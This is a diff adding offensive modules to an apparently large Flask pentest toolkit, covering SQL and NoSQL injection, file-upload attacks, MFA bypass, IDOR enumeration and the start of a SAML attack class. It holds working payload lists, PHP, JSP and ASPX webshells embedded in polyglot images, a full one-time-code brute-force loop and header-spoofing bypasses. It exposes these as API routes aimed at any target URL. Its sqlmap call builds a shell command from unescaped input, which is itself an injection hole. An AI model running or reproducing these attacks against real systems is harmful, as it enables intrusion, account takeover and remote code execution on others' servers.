@@ -26801,6 +26801,1045 @@ def xxe_scan_route():
         return jsonify({"error": f"Server error: {e}"}), 500
 
 
+# ─────────────────────────────────────────────────────────────────────────────
+# SQL INJECTION SUITE
+# ─────────────────────────────────────────────────────────────────────────────
+class SQLInjectionScanner:
+    """Error-based, blind time-based, OOB, sqlmap integration, NoSQL injection."""
+
+    ERROR_PATTERNS = {
+        "mysql":      ["you have an error in your sql syntax", "warning: mysql", "mysql_fetch", "mysql_num_rows", "supplied argument is not a valid mysql"],
+        "mssql":      ["unclosed quotation mark", "microsoft ole db provider for sql", "odbc sql server driver", "mssql_query()", "syntax error converting"],
+        "oracle":     ["ora-01756", "ora-00933", "ora-00907", "oracle error", "quoted string not properly terminated"],
+        "postgresql": ["pg_query()", "pg_exec()", "postgresql query failed", "unterminated quoted string", "syntax error at or near"],
+        "sqlite":     ["sqlite3::query", "sqlite_query", "sqlite error", "unrecognized token"],
+        "generic":    ["sql syntax", "syntax error", "invalid query", "database error", "odbc driver", "sqlexception", "unclosed"],
+    }
+
+    ERROR_PAYLOADS = ["'", '"', "''", '";', "';", "--", "#", "/*", "' OR '1'='1", '" OR "1"="1', "' OR 1=1--", "1' ORDER BY 1--", "1' ORDER BY 100--"]
+
+    TIME_PAYLOADS = {
+        "mysql":      ["' AND SLEEP(5)--", "\" AND SLEEP(5)--", "1 AND SLEEP(5)", "' OR SLEEP(5)--"],
+        "mssql":      ["'; WAITFOR DELAY '0:0:5'--", "1; WAITFOR DELAY '0:0:5'--"],
+        "postgresql": ["'; SELECT pg_sleep(5)--", "1; SELECT pg_sleep(5)--"],
+        "oracle":     ["' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--"],
+        "generic":    ["' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--", "'; SELECT pg_sleep(5)--"],
+    }
+
+    UNION_PAYLOADS = [
+        "' UNION SELECT NULL--",
+        "' UNION SELECT NULL,NULL--",
+        "' UNION SELECT NULL,NULL,NULL--",
+        "' UNION SELECT 1,2,3--",
+        "' UNION SELECT username,password,3 FROM users--",
+        "' UNION ALL SELECT NULL,NULL,NULL--",
+    ]
+
+    NOSQL_PAYLOADS = {
+        "mongodb_auth_bypass": [
+            '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
+            '{"username": {"$ne": null}, "password": {"$ne": null}}',
+            '{"username": "admin", "password": {"$gt": ""}}',
+        ],
+        "mongodb_operator": ["[$ne]=1", "[$gt]=", "[$regex]=.*", "[$where]=1==1"],
+        "xpath_injection":  ["' or '1'='1", "' or 1=1 or 'x'='x", "x' or name()='username' or 'x'='y"],
+    }
+
+    def _detect_error_sqli(self, url: str, params: dict) -> List[Dict]:
+        findings = []
+        for param in params:
+            for payload in self.ERROR_PAYLOADS:
+                test = dict(params)
+                test[param] = payload
+                try:
+                    r = requests.get(url, params=test, timeout=10, verify=False)
+                    body = r.text.lower()
+                    for db, patterns in self.ERROR_PATTERNS.items():
+                        for p in patterns:
+                            if p in body:
+                                findings.append({
+                                    "type": "error_based",
+                                    "db": db,
+                                    "param": param,
+                                    "payload": payload,
+                                    "severity": "CRITICAL",
+                                    "evidence": p,
+                                    "url": url,
+                                })
+                                break
+                except Exception:
+                    pass
+        return findings
+
+    def _detect_blind_time(self, url: str, params: dict) -> List[Dict]:
+        findings = []
+        for param in params:
+            for db, payloads in self.TIME_PAYLOADS.items():
+                for payload in payloads[:2]:
+                    test = dict(params)
+                    test[param] = payload
+                    try:
+                        start = time.time()
+                        requests.get(url, params=test, timeout=15, verify=False)
+                        elapsed = time.time() - start
+                        if elapsed >= 4.5:
+                            findings.append({
+                                "type": "blind_time_based",
+                                "db": db,
+                                "param": param,
+                                "payload": payload,
+                                "severity": "CRITICAL",
+                                "delay_sec": round(elapsed, 2),
+                                "url": url,
+                            })
+                    except requests.Timeout:
+                        findings.append({
+                            "type": "blind_time_based",
+                            "db": db,
+                            "param": param,
+                            "payload": payload,
+                            "severity": "CRITICAL",
+                            "delay_sec": ">15 (timeout)",
+                            "url": url,
+                        })
+                    except Exception:
+                        pass
+        return findings
+
+    def _detect_union(self, url: str, params: dict) -> List[Dict]:
+        findings = []
+        for param in params:
+            for payload in self.UNION_PAYLOADS:
+                test = dict(params)
+                test[param] = payload
+                try:
+                    r = requests.get(url, params=test, timeout=10, verify=False)
+                    if any(kw in r.text.lower() for kw in ["root:", "admin", "password", "username", "user_id"]):
+                        findings.append({
+                            "type": "union_based",
+                            "param": param,
+                            "payload": payload,
+                            "severity": "CRITICAL",
+                            "url": url,
+                        })
+                except Exception:
+                    pass
+        return findings
+
+    def _run_sqlmap(self, url: str, params: dict, level: int = 1, risk: int = 1) -> Dict:
+        if not shutil.which("sqlmap"):
+            return {"available": False, "note": "sqlmap not in PATH"}
+        param_str = " ".join(f"-p {p}" for p in params)
+        cmd = f"sqlmap -u \"{url}\" {param_str} --level={level} --risk={risk} --batch --output-dir={tempfile.gettempdir()}/sqlmap_out --forms --crawl=2 --random-agent 2>&1"
+        try:
+            out = subprocess.check_output(cmd, shell=True, timeout=120, stderr=subprocess.STDOUT).decode("utf-8", errors="replace")
+            injectable = "is vulnerable" in out.lower() or "sqlmap identified" in out.lower()
+            return {"available": True, "injectable": injectable, "output": out[-3000:]}
+        except subprocess.TimeoutExpired:
+            return {"available": True, "error": "sqlmap timed out after 120s"}
+        except Exception as e:
+            return {"available": True, "error": str(e)}
+
+    def _test_nosql(self, url: str, params: dict) -> List[Dict]:
+        findings = []
+        for param in params:
+            for op_payload in self.NOSQL_PAYLOADS["mongodb_operator"]:
+                try:
+                    test_url = f"{url}?{param}{op_payload}"
+                    r = requests.get(test_url, timeout=8, verify=False)
+                    baseline = requests.get(url, params=params, timeout=8, verify=False)
+                    if r.status_code == 200 and baseline.status_code != 200:
+                        findings.append({
+                            "type": "nosql_mongodb_operator",
+                            "param": param,
+                            "payload": op_payload,
+                            "severity": "HIGH",
+                            "url": url,
+                        })
+                except Exception:
+                    pass
+
+        login_hints = ["login", "signin", "auth", "api/user", "session"]
+        if any(h in url.lower() for h in login_hints):
+            for payload in self.NOSQL_PAYLOADS["mongodb_auth_bypass"]:
+                try:
+                    r = requests.post(url, data=payload, headers={"Content-Type": "application/json"}, timeout=8, verify=False)
+                    if r.status_code in [200, 302] and any(kw in r.text.lower() for kw in ["token", "session", "welcome", "dashboard", "logout"]):
+                        findings.append({
+                            "type": "nosql_auth_bypass",
+                            "payload": payload,
+                            "severity": "CRITICAL",
+                            "url": url,
+                        })
+                except Exception:
+                    pass
+        return findings
+
+    def _extract_params(self, url: str) -> dict:
+        from urllib.parse import urlparse, parse_qs
+        parsed = urlparse(url)
+        params = {k: v[0] for k, v in parse_qs(parsed.query).items()}
+        if not params:
+            params = {"id": "1", "q": "test", "search": "test", "name": "test", "user": "test"}
+        return params
+
+    def run(self, target: str, run_error: bool = True, run_time: bool = True,
+            run_union: bool = True, run_nosql: bool = True, run_sqlmap: bool = False,
+            sqlmap_level: int = 1, sqlmap_risk: int = 1,
+            custom_params: Optional[dict] = None) -> Dict:
+        start = time.time()
+        params = custom_params if custom_params else self._extract_params(target)
+        all_findings: List[Dict] = []
+
+        if run_error:
+            all_findings.extend(self._detect_error_sqli(target, params))
+        if run_union:
+            all_findings.extend(self._detect_union(target, params))
+        if run_time:
+            all_findings.extend(self._detect_blind_time(target, params))
+        if run_nosql:
+            all_findings.extend(self._test_nosql(target, params))
+
+        sqlmap_result = {}
+        if run_sqlmap:
+            sqlmap_result = self._run_sqlmap(target, params, sqlmap_level, sqlmap_risk)
+
+        seen = set()
+        unique = []
+        for f in all_findings:
+            key = (f["type"], f.get("param", ""), f["payload"])
+            if key not in seen:
+                seen.add(key)
+                unique.append(f)
+
+        critical = sum(1 for f in unique if f.get("severity") == "CRITICAL")
+        high     = sum(1 for f in unique if f.get("severity") == "HIGH")
+
+        return {
+            "target": target,
+            "params_tested": list(params.keys()),
+            "findings": unique,
+            "critical": critical,
+            "high": high,
+            "sqlmap": sqlmap_result,
+            "duration_sec": round(time.time() - start, 2),
+        }
+
+
+sqli_scanner = SQLInjectionScanner()
+
+
+@app.route("/api/tools/sqli/scan", methods=["POST"])
+def sqli_scan_route():
+    try:
+        data = request.get_json() or {}
+        result = sqli_scanner.run(
+            target=data.get("target", ""),
+            run_error=data.get("run_error", True),
+            run_time=data.get("run_time", True),
+            run_union=data.get("run_union", True),
+            run_nosql=data.get("run_nosql", True),
+            run_sqlmap=data.get("run_sqlmap", False),
+            sqlmap_level=data.get("sqlmap_level", 1),
+            sqlmap_risk=data.get("sqlmap_risk", 1),
+            custom_params=data.get("custom_params"),
+        )
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 sqli/scan error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# FILE UPLOAD TESTER
+# ─────────────────────────────────────────────────────────────────────────────
+class FileUploadTester:
+    """Extension bypass, MIME manipulation, polyglot files, path traversal, webshell delivery."""
+
+    UPLOAD_PATHS = ["/upload", "/uploads", "/file/upload", "/api/upload", "/media/upload",
+                    "/avatar", "/profile/photo", "/api/files", "/image/upload", "/document/upload",
+                    "/attachment", "/import", "/files/new", "/assets/upload"]
+
+    WEBSHELL_PHP  = b"<?php system($_GET['cmd']); ?>"
+    WEBSHELL_JSP  = b"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
+    WEBSHELL_ASPX = b"<% Response.Write(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo(Request[\"cmd\"])}.Start()); %>"
+
+    BYPASS_EXTENSIONS = {
+        "php":  ["php", "php3", "php4", "php5", "php7", "phtml", "phar", "pHp", "PHP", "php%00.jpg"],
+        "asp":  ["asp", "aspx", "asa", "cer", "cdx"],
+        "jsp":  ["jsp", "jspx", "jsw", "jsv", "jspf"],
+        "perl": ["pl", "pm", "cgi"],
+        "py":   ["py", "pyc"],
+    }
+
+    JPEG_MAGIC = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00"
+    GIF_MAGIC  = b"GIF89a"
+    PNG_MAGIC  = b"\x89PNG\r\n\x1a\n"
+
+    def _discover_upload_endpoints(self, base_url: str) -> List[str]:
+        found = []
+        for path in self.UPLOAD_PATHS:
+            try:
+                r = requests.get(f"{base_url}{path}", timeout=5, verify=False)
+                if r.status_code not in [404, 410]:
+                    found.append(f"{base_url}{path}")
+            except Exception:
+                pass
+        return found
+
+    def _test_extension_bypass(self, upload_url: str) -> List[Dict]:
+        findings = []
+        for lang, exts in self.BYPASS_EXTENSIONS.items():
+            for ext in exts:
+                fname = f"test_shell.{ext}"
+                try:
+                    files = {"file": (fname, self.WEBSHELL_PHP, "image/jpeg")}
+                    r = requests.post(upload_url, files=files, timeout=10, verify=False)
+                    if r.status_code in [200, 201, 302]:
+                        body = r.text.lower()
+                        if any(kw in body for kw in ["success", "uploaded", "url", "path", "file"]):
+                            findings.append({
+                                "type": "extension_bypass",
+                                "extension": ext,
+                                "language": lang,
+                                "severity": "CRITICAL",
+                                "response_code": r.status_code,
+                                "url": upload_url,
+                            })
+                except Exception:
+                    pass
+        return findings
+
+    def _test_mime_bypass(self, upload_url: str) -> List[Dict]:
+        findings = []
+        mime_list = ["image/jpeg", "image/png", "image/gif", "image/webp", "image/svg+xml", "application/octet-stream"]
+        for mime in mime_list:
+            try:
+                payload = self.JPEG_MAGIC + self.WEBSHELL_PHP
+                files = {"file": ("shell.php", payload, mime)}
+                r = requests.post(upload_url, files=files, timeout=10, verify=False)
+                if r.status_code in [200, 201]:
+                    findings.append({
+                        "type": "mime_bypass",
+                        "mime_sent": mime,
+                        "severity": "CRITICAL",
+                        "url": upload_url,
+                    })
+            except Exception:
+                pass
+        return findings
+
+    def _test_polyglot(self, upload_url: str) -> List[Dict]:
+        findings = []
+        polyglots = [
+            ("gif_php",  b"GIF89a" + b"<?php system($_GET['cmd']); ?>",                                          "shell.php",  "image/gif"),
+            ("png_php",  self.PNG_MAGIC + b"\x00" * 8 + b"<?php system($_GET['cmd']); ?>",                      "image.php",  "image/png"),
+            ("jpeg_php", self.JPEG_MAGIC + b"<?php system($_GET['cmd']); ?>" + b"\xff\xd9",                     "img.php",    "image/jpeg"),
+        ]
+        for name, data, fname, mime in polyglots:
+            try:
+                files = {"file": (fname, data, mime)}
+                r = requests.post(upload_url, files=files, timeout=10, verify=False)
+                if r.status_code in [200, 201]:
+                    findings.append({"type": "polyglot_upload", "variant": name, "severity": "CRITICAL", "url": upload_url})
+            except Exception:
+                pass
+        return findings
+
+    def _test_path_traversal(self, upload_url: str) -> List[Dict]:
+        findings = []
+        traversal_names = ["../shell.php", "../../shell.php", "..%2Fshell.php",
+                           "..%252Fshell.php", "....//shell.php", "%2e%2e%2fshell.php"]
+        for fname in traversal_names:
+            try:
+                files = {"file": (fname, self.WEBSHELL_PHP, "image/jpeg")}
+                r = requests.post(upload_url, files=files, timeout=10, verify=False)
+                if r.status_code in [200, 201]:
+                    body = r.text.lower()
+                    if any(kw in body for kw in ["success", "uploaded", "saved"]):
+                        findings.append({"type": "path_traversal_upload", "filename": fname, "severity": "CRITICAL", "url": upload_url})
+            except Exception:
+                pass
+        return findings
+
+    def _test_double_extension(self, upload_url: str) -> List[Dict]:
+        findings = []
+        names = ["shell.php.jpg", "shell.php.png", "shell.php%00.jpg", "shell.jpg.php", "shell.PNG.php"]
+        for fname in names:
+            try:
+                files = {"file": (fname, self.JPEG_MAGIC + self.WEBSHELL_PHP, "image/jpeg")}
+                r = requests.post(upload_url, files=files, timeout=10, verify=False)
+                if r.status_code in [200, 201]:
+                    findings.append({"type": "double_extension", "filename": fname, "severity": "HIGH", "url": upload_url})
+            except Exception:
+                pass
+        return findings
+
+    def _test_svg_xss(self, upload_url: str) -> List[Dict]:
+        findings = []
+        svg_xss  = b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>'
+        svg_ssrf = b'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><svg>&xxe;</svg>'
+        for name, data, vuln in [("svg_xss", svg_xss, "XSS"), ("svg_ssrf", svg_ssrf, "SSRF/XXE")]:
+            try:
+                files = {"file": ("image.svg", data, "image/svg+xml")}
+                r = requests.post(upload_url, files=files, timeout=10, verify=False)
+                if r.status_code in [200, 201]:
+                    findings.append({"type": "svg_upload", "variant": name, "risk": vuln, "severity": "HIGH", "url": upload_url})
+            except Exception:
+                pass
+        return findings
+
+    def run(self, target: str, upload_url: Optional[str] = None,
+            run_discover: bool = True, run_extension: bool = True,
+            run_mime: bool = True, run_polyglot: bool = True,
+            run_traversal: bool = True, run_double: bool = True,
+            run_svg: bool = True) -> Dict:
+        start = time.time()
+        base_url = target.rstrip("/")
+        findings: List[Dict] = []
+
+        endpoints = [upload_url] if upload_url else []
+        if run_discover:
+            endpoints.extend(self._discover_upload_endpoints(base_url))
+
+        if not endpoints:
+            return {"target": target, "error": "No upload endpoints discovered", "findings": []}
+
+        for ep in list(set(e for e in endpoints if e)):
+            if run_extension:  findings.extend(self._test_extension_bypass(ep))
+            if run_mime:       findings.extend(self._test_mime_bypass(ep))
+            if run_polyglot:   findings.extend(self._test_polyglot(ep))
+            if run_traversal:  findings.extend(self._test_path_traversal(ep))
+            if run_double:     findings.extend(self._test_double_extension(ep))
+            if run_svg:        findings.extend(self._test_svg_xss(ep))
+
+        critical = sum(1 for f in findings if f.get("severity") == "CRITICAL")
+        high     = sum(1 for f in findings if f.get("severity") == "HIGH")
+
+        return {
+            "target": target,
+            "endpoints_tested": list(set(e for e in endpoints if e)),
+            "findings": findings,
+            "critical": critical,
+            "high": high,
+            "duration_sec": round(time.time() - start, 2),
+        }
+
+
+upload_tester = FileUploadTester()
+
+
+@app.route("/api/tools/upload/test", methods=["POST"])
+def upload_test_route():
+    try:
+        data = request.get_json() or {}
+        result = upload_tester.run(
+            target=data.get("target", ""),
+            upload_url=data.get("upload_url"),
+            run_discover=data.get("run_discover", True),
+            run_extension=data.get("run_extension", True),
+            run_mime=data.get("run_mime", True),
+            run_polyglot=data.get("run_polyglot", True),
+            run_traversal=data.get("run_traversal", True),
+            run_double=data.get("run_double", True),
+            run_svg=data.get("run_svg", True),
+        )
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 upload/test error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# 2FA / MFA BYPASS
+# ─────────────────────────────────────────────────────────────────────────────
+class MFABypassTester:
+    """TOTP brute-force, response manipulation, backup code abuse, rate-limit bypass."""
+
+    MFA_PATHS = ["/mfa", "/2fa", "/otp", "/verify", "/auth/otp", "/auth/2fa",
+                 "/api/mfa/verify", "/api/2fa/verify", "/api/otp/verify",
+                 "/login/mfa", "/login/2fa", "/account/verify", "/confirm"]
+
+    BACKUP_CODES = ["000000", "123456", "999999", "111111", "000001",
+                    "backup", "BACKUP", "recovery", "12345678", "00000000"]
+
+    BYPASS_HEADERS = [
+        {"X-Forwarded-For": "127.0.0.1"},
+        {"X-Real-IP": "127.0.0.1"},
+        {"X-Originating-IP": "127.0.0.1"},
+        {"X-Remote-IP": "127.0.0.1"},
+        {"X-Custom-IP-Authorization": "127.0.0.1"},
+    ]
+
+    def _discover_mfa_endpoints(self, base_url: str) -> List[str]:
+        found = []
+        for path in self.MFA_PATHS:
+            try:
+                r = requests.get(f"{base_url}{path}", timeout=5, verify=False, allow_redirects=False)
+                if r.status_code not in [404, 410]:
+                    found.append(f"{base_url}{path}")
+            except Exception:
+                pass
+        return found
+
+    def _totp_bruteforce(self, mfa_url: str, session_cookie: Optional[str] = None,
+                         otp_field: str = "otp_code") -> Dict:
+        headers = {"Cookie": session_cookie} if session_cookie else {}
+        codes_tried = 0
+        for code in range(10000):
+            payload = {otp_field: f"{code:06d}"}
+            try:
+                r = requests.post(mfa_url, data=payload, headers=headers, timeout=5, verify=False)
+                codes_tried += 1
+                body = r.text.lower()
+                if r.status_code in [200, 302] and any(kw in body for kw in ["success", "welcome", "dashboard", "token", "session"]):
+                    return {"result": "bypass", "code": f"{code:06d}", "codes_tried": codes_tried}
+                if r.status_code == 429 or "too many" in body:
+                    return {"result": "rate_limited", "codes_tried": codes_tried, "note": f"Rate limit hit at {codes_tried}"}
+            except Exception:
+                pass
+        return {"result": "no_bypass", "codes_tried": codes_tried}
+
+    def _test_backup_codes(self, mfa_url: str, session_cookie: Optional[str] = None,
+                           otp_field: str = "otp_code") -> List[Dict]:
+        headers = {"Cookie": session_cookie} if session_cookie else {}
+        findings = []
+        for code in self.BACKUP_CODES:
+            try:
+                r = requests.post(mfa_url, data={otp_field: code}, headers=headers, timeout=5, verify=False)
+                if r.status_code in [200, 302] and any(kw in r.text.lower() for kw in ["success", "welcome", "dashboard"]):
+                    findings.append({"type": "backup_code_accepted", "code": code, "severity": "CRITICAL", "url": mfa_url})
+            except Exception:
+                pass
+        return findings
+
+    def _test_response_manipulation(self, mfa_url: str, session_cookie: Optional[str] = None,
+                                     otp_field: str = "otp_code") -> List[Dict]:
+        findings = []
+        headers = {"Cookie": session_cookie} if session_cookie else {}
+        try:
+            r_a = requests.post(mfa_url, data={otp_field: "000000"}, headers=headers, timeout=8, verify=False)
+            r_b = requests.post(mfa_url, data={otp_field: "000001"}, headers=headers, timeout=8, verify=False)
+            if r_a.text == r_b.text and r_a.status_code == r_b.status_code:
+                findings.append({
+                    "type": "response_identical_regardless_of_otp",
+                    "severity": "HIGH",
+                    "note": "Same response for different OTP values — possible client-side only validation",
+                    "url": mfa_url,
+                })
+        except Exception:
+            pass
+        return findings
+
+    def _test_ip_bypass(self, mfa_url: str, otp_field: str = "otp_code") -> List[Dict]:
+        findings = []
+        for hdrs in self.BYPASS_HEADERS:
+            try:
+                r = requests.post(mfa_url, data={otp_field: "000000"}, headers=hdrs, timeout=8, verify=False)
+                if r.status_code in [200, 302] and any(kw in r.text.lower() for kw in ["success", "dashboard", "welcome"]):
+                    findings.append({
+                        "type": "ip_bypass",
+                        "header": list(hdrs.keys())[0],
+                        "severity": "CRITICAL",
+                        "url": mfa_url,
+                    })
+            except Exception:
+                pass
+        return findings
+
+    def _test_skip_mfa(self, base_url: str, post_mfa_path: str = "/dashboard",
+                       session_cookie: Optional[str] = None) -> Dict:
+        headers = {"Cookie": session_cookie} if session_cookie else {}
+        try:
+            r = requests.get(f"{base_url}{post_mfa_path}", headers=headers, timeout=8, verify=False, allow_redirects=False)
+            if r.status_code == 200:
+                return {
+                    "type": "mfa_skip",
+                    "severity": "CRITICAL",
+                    "note": f"Accessed {post_mfa_path} without completing MFA — forced browsing possible",
+                }
+        except Exception:
+            pass
+        return {}
+
+    def run(self, target: str, mfa_url: Optional[str] = None,
+            session_cookie: Optional[str] = None, otp_field: str = "otp_code",
+            run_discover: bool = True, run_bruteforce: bool = True,
+            run_backup: bool = True, run_response: bool = True,
+            run_ip_bypass: bool = True, run_skip: bool = True,
+            post_mfa_path: str = "/dashboard") -> Dict:
+        start = time.time()
+        base_url = target.rstrip("/")
+        findings: List[Dict] = []
+
+        endpoints = [mfa_url] if mfa_url else []
+        if run_discover:
+            endpoints.extend(self._discover_mfa_endpoints(base_url))
+
+        for ep in list(set(e for e in endpoints if e)):
+            if run_backup:    findings.extend(self._test_backup_codes(ep, session_cookie, otp_field))
+            if run_response:  findings.extend(self._test_response_manipulation(ep, session_cookie, otp_field))
+            if run_ip_bypass: findings.extend(self._test_ip_bypass(ep, otp_field))
+
+        bruteforce_result = {}
+        if run_bruteforce and endpoints:
+            bruteforce_result = self._totp_bruteforce(
+                next(e for e in endpoints if e), session_cookie, otp_field
+            )
+
+        skip_result = {}
+        if run_skip:
+            skip_result = self._test_skip_mfa(base_url, post_mfa_path, session_cookie)
+            if skip_result:
+                findings.append(skip_result)
+
+        critical = sum(1 for f in findings if f.get("severity") == "CRITICAL")
+        high     = sum(1 for f in findings if f.get("severity") == "HIGH")
+
+        return {
+            "target": target,
+            "endpoints_tested": list(set(e for e in endpoints if e)),
+            "findings": findings,
+            "bruteforce": bruteforce_result,
+            "critical": critical,
+            "high": high,
+            "duration_sec": round(time.time() - start, 2),
+        }
+
+
+mfa_tester = MFABypassTester()
+
+
+@app.route("/api/tools/mfa/bypass", methods=["POST"])
+def mfa_bypass_route():
+    try:
+        data = request.get_json() or {}
+        result = mfa_tester.run(
+            target=data.get("target", ""),
+            mfa_url=data.get("mfa_url"),
+            session_cookie=data.get("session_cookie"),
+            otp_field=data.get("otp_field", "otp_code"),
+            run_discover=data.get("run_discover", True),
+            run_bruteforce=data.get("run_bruteforce", True),
+            run_backup=data.get("run_backup", True),
+            run_response=data.get("run_response", True),
+            run_ip_bypass=data.get("run_ip_bypass", True),
+            run_skip=data.get("run_skip", True),
+            post_mfa_path=data.get("post_mfa_path", "/dashboard"),
+        )
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 mfa/bypass error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# IDOR / BOLA SCANNER
+# ─────────────────────────────────────────────────────────────────────────────
+class IDORScanner:
+    """Broken Object Level Authorization — ID enumeration and horizontal/vertical priv-esc probes."""
+
+    ID_PARAMS = ["id", "user_id", "userId", "account_id", "accountId", "order_id",
+                 "orderId", "file_id", "fileId", "doc_id", "docId", "profile_id",
+                 "profileId", "customer_id", "customerId", "record_id", "recordId",
+                 "uid", "pid", "rid", "oid"]
+
+    PATH_ID_PATTERN = re.compile(r"(/\w+/)(\d+|[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})(/|$)")
+
+    def _extract_ids_from_url(self, url: str) -> List[Dict]:
+        from urllib.parse import urlparse, parse_qs
+        targets = []
+        parsed = urlparse(url)
+        for k, v in parse_qs(parsed.query).items():
+            if k.lower() in [p.lower() for p in self.ID_PARAMS]:
+                targets.append({"location": "query", "param": k, "value": v[0], "original_url": url})
+        for match in self.PATH_ID_PATTERN.finditer(parsed.path):
+            targets.append({"location": "path", "segment": match.group(0), "value": match.group(2), "original_url": url})
+        return targets
+
+    def _probe_id_range(self, url: str, param: str, original_id: str,
+                        auth_headers: dict, probe_range: int = 20) -> List[Dict]:
+        findings = []
+        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+        try:
+            base_id = int(original_id)
+        except ValueError:
+            return findings
+
+        try:
+            own_resp = requests.get(url, headers=auth_headers, timeout=8, verify=False)
+            own_len  = len(own_resp.text)
+            own_code = own_resp.status_code
+        except Exception:
+            return findings
+
+        for delta in range(1, probe_range + 1):
+            for test_id in [base_id + delta, base_id - delta]:
+                if test_id <= 0:
+                    continue
+                parsed = urlparse(url)
+                qs = parse_qs(parsed.query)
+                qs[param] = [str(test_id)]
+                new_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
+                try:
+                    r = requests.get(new_url, headers=auth_headers, timeout=8, verify=False)
+                    if r.status_code == own_code and abs(len(r.text) - own_len) < own_len * 0.3:
+                        findings.append({
+                            "type": "idor_horizontal",
+                            "param": param,
+                            "own_id": str(base_id),
+                            "accessed_id": str(test_id),
+                            "severity": "HIGH",
+                            "url": new_url,
+                        })
+                except Exception:
+                    pass
+        return findings
+
+    def _probe_path_ids(self, url: str, auth_headers: dict, probe_range: int = 10) -> List[Dict]:
+        findings = []
+        for match in self.PATH_ID_PATTERN.finditer(url):
+            try:
+                base_id = int(match.group(2))
+            except ValueError:
+                continue
+            for delta in range(1, probe_range + 1):
+                for test_id in [base_id + delta, base_id - delta]:
+                    if test_id <= 0:
+                        continue
+                    new_url = url[:match.start(2)] + str(test_id) + url[match.end(2):]
+                    try:
+                        own_r  = requests.get(url,     headers=auth_headers, timeout=8, verify=False)
+                        test_r = requests.get(new_url, headers=auth_headers, timeout=8, verify=False)
+                        if test_r.status_code == 200 and own_r.status_code == 200 and test_r.text != own_r.text:
+                            findings.append({
+                                "type": "idor_path_segment",
+                                "original_id": str(base_id),
+                                "accessed_id": str(test_id),
+                                "severity": "HIGH",
+                                "url": new_url,
+                            })
+                    except Exception:
+                        pass
+        return findings
+
+    def _test_vertical_privesc(self, base_url: str, user_headers: dict, admin_headers: dict) -> List[Dict]:
+        findings = []
+        admin_paths = ["/admin", "/api/admin", "/admin/users", "/api/users",
+                       "/dashboard/admin", "/manage", "/internal"]
+        for path in admin_paths:
+            try:
+                admin_r = requests.get(f"{base_url}{path}", headers=admin_headers, timeout=8, verify=False)
+                user_r  = requests.get(f"{base_url}{path}", headers=user_headers,  timeout=8, verify=False)
+                if admin_r.status_code == 200 and user_r.status_code == 200:
+                    findings.append({
+                        "type": "vertical_privesc",
+                        "path": path,
+                        "severity": "CRITICAL",
+                        "url": f"{base_url}{path}",
+                        "note": "Admin endpoint accessible with low-privilege credentials",
+                    })
+            except Exception:
+                pass
+        return findings
+
+    def _test_unauthenticated(self, url: str, auth_headers: dict) -> List[Dict]:
+        findings = []
+        try:
+            auth_r   = requests.get(url, headers=auth_headers, timeout=8, verify=False)
+            unauth_r = requests.get(url, timeout=8, verify=False)
+            if auth_r.status_code == 200 and unauth_r.status_code == 200 and len(unauth_r.text) > 50:
+                findings.append({
+                    "type": "unauthenticated_access",
+                    "severity": "CRITICAL",
+                    "url": url,
+                    "note": "Resource accessible without authentication",
+                })
+        except Exception:
+            pass
+        return findings
+
+    def run(self, target: str, auth_token: Optional[str] = None,
+            admin_token: Optional[str] = None, probe_range: int = 20,
+            run_horizontal: bool = True, run_vertical: bool = True,
+            run_unauth: bool = True, custom_endpoints: Optional[List[str]] = None) -> Dict:
+        start = time.time()
+        base_url = target.rstrip("/")
+        auth_headers  = {"Authorization": f"Bearer {auth_token}"}  if auth_token  else {}
+        admin_headers = {"Authorization": f"Bearer {admin_token}"} if admin_token else {}
+        endpoints = custom_endpoints if custom_endpoints else [base_url]
+        all_findings: List[Dict] = []
+
+        for ep in endpoints:
+            id_targets = self._extract_ids_from_url(ep)
+            if run_horizontal:
+                for t in id_targets:
+                    if t["location"] == "query":
+                        all_findings.extend(self._probe_id_range(ep, t["param"], t["value"], auth_headers, probe_range))
+                all_findings.extend(self._probe_path_ids(ep, auth_headers, probe_range // 2))
+            if run_unauth:
+                all_findings.extend(self._test_unauthenticated(ep, auth_headers))
+
+        if run_vertical and admin_token:
+            all_findings.extend(self._test_vertical_privesc(base_url, auth_headers, admin_headers))
+
+        critical = sum(1 for f in all_findings if f.get("severity") == "CRITICAL")
+        high     = sum(1 for f in all_findings if f.get("severity") == "HIGH")
+
+        return {
+            "target": target,
+            "endpoints_tested": endpoints,
+            "findings": all_findings,
+            "critical": critical,
+            "high": high,
+            "duration_sec": round(time.time() - start, 2),
+        }
+
+
+idor_scanner = IDORScanner()
+
+
+@app.route("/api/tools/idor/scan", methods=["POST"])
+def idor_scan_route():
+    try:
+        data = request.get_json() or {}
+        result = idor_scanner.run(
+            target=data.get("target", ""),
+            auth_token=data.get("auth_token"),
+            admin_token=data.get("admin_token"),
+            probe_range=data.get("probe_range", 20),
+            run_horizontal=data.get("run_horizontal", True),
+            run_vertical=data.get("run_vertical", True),
+            run_unauth=data.get("run_unauth", True),
+            custom_endpoints=data.get("custom_endpoints"),
+        )
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 idor/scan error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# SAML ATTACKS
+# ─────────────────────────────────────────────────────────────────────────────
+class SAMLAttacker:
+    """Signature wrapping, XXE in assertions, assertion replay, cert bypass, attribute manipulation."""
+
